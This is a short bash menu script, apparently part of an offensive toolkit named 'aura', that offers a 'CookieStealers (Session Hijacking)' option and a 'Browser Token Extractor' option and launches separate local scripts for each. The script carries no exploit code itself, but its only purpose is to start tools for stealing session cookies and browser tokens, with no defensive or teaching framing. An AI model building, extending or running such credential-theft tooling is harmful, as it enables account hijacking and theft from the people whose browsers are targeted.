#!/bin/bash

echo "========================================="
echo "       ADVANCED HIJACKING MENU"
echo "========================================="
echo ""
echo "1. CookieStealers (Session Hijacking)"
echo "2. Browser Token Extractor"
echo "0. Back to Main Menu"
echo ""
read -p "Select option (0-2): " OPT

case $OPT in
    1) bash ~/aura_cookie.sh ;;
    2) bash ~/aura_token_extract.sh ;;
    0) bash ~/aura.sh ;;
    *) echo "Invalid option" ;;
esac
